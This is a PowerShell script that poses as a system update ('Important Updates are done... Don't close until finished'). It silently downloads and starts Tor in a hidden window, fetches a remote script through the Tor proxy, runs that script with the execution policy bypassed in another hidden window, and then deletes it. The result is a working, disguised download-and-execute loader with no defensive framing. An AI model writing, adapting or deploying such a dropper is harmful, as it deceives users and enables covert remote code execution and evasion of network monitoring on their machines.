echo "Important Updates are done..."
echo "Don't close until finished..."

# -----------------------
# Configuration
# -----------------------
$P = $PSScriptRoot
$BaseDir = Join-Path $P "tor-exe"
$Archive = Join-Path $P "tor-expert.tar.gz"
$TorExe = Join-Path $BaseDir "tor.exe"
$TorUrl = "https://archive.torproject.org/tor-package-archive/torbrowser/15.0.3/tor-expert-bundle-windows-x86_64-15.0.3.tar.gz"

$TorPort = 9050
$DataDir = Join-Path $P "tor-data"
# $OnionUrl = "https://duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion/"
$OnionUrl = "https://manuelwestermeier.github.io/test.ps1"

# -----------------------
# Helper Functions
# -----------------------
function Download-Tor {
    param(
        [string] $Url = $TorUrl,
        [string] $OutFile = $Archive
    )

    Write-Host "Downloading Tor expert bundle..."
    Invoke-WebRequest -Uri $Url -OutFile $OutFile -UseBasicParsing

    if ((Get-Item $OutFile).Length -lt 5MB) {
        Remove-Item -Force $OutFile -ErrorAction SilentlyContinue
        throw "Download failed or archive too small."
    }
}

function Extract-Tor {
    param(
        [string] $ArchiveFile = $Archive,
        [string] $Destination = $BaseDir
    )

    Write-Host "Extracting Tor..."
    if (-not (Test-Path $Destination)) { 
        New-Item -ItemType Directory -Force -Path $Destination | Out-Null 
    }

    tar.exe -xzf $ArchiveFile -C $Destination --strip-components=1
    Remove-Item $ArchiveFile -Force

    if (-not (Test-Path $TorExe)) { throw "tor.exe not found after extraction." }
    Write-Host "Tor extracted to $Destination"
}

# -----------------------
# Ensure Tor exists
# -----------------------
try {
    if (-not (Test-Path $TorExe)) {
        Download-Tor
        Extract-Tor
    }
    else {
        Write-Host "Tor executable already present: $TorExe"
    }
}
catch {
    Write-Error "Error downloading or extracting Tor: $_"
    exit 1
}

# Ensure data directory exists
if (-not (Test-Path $DataDir)) { 
    New-Item -ItemType Directory -Force -Path $DataDir | Out-Null 
}

# -----------------------
# Start Tor process
# -----------------------
$Tor = Start-Process -FilePath $TorExe `
    -ArgumentList "--SocksPort $TorPort --DataDirectory `"$DataDir`"" `
    -PassThru -WindowStyle Hidden

# -----------------------
# Wait until Tor SOCKS port is ready
# -----------------------
Write-Host "Waiting for Tor SOCKS port $TorPort..."
while (-not (Test-NetConnection 127.0.0.1 -Port $TorPort).TcpTestSucceeded) { 
    Start-Sleep -Seconds 1 
}

# -----------------------
# Fetch onion site content (save to file)
# -----------------------
$OutputFile = Join-Path $P "data.ps1"

try {
    Write-Host "Fetching $OnionUrl via Tor (saving to data.ps1)..."
    curl.exe --socks5-hostname "127.0.0.1:$TorPort" -s $OnionUrl `
        | Out-File -FilePath $OutputFile -Encoding UTF8 -Force
}
finally {
    if ($Tor -and !$Tor.HasExited) { 
        Write-Host "Stopping Tor..."
        $Tor.Kill() 
    }
}

powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File $OutputFile" -WindowStyle Hidden

if (Test-Path $OutputFile) {
    Remove-Item -Path $OutputFile -Force
}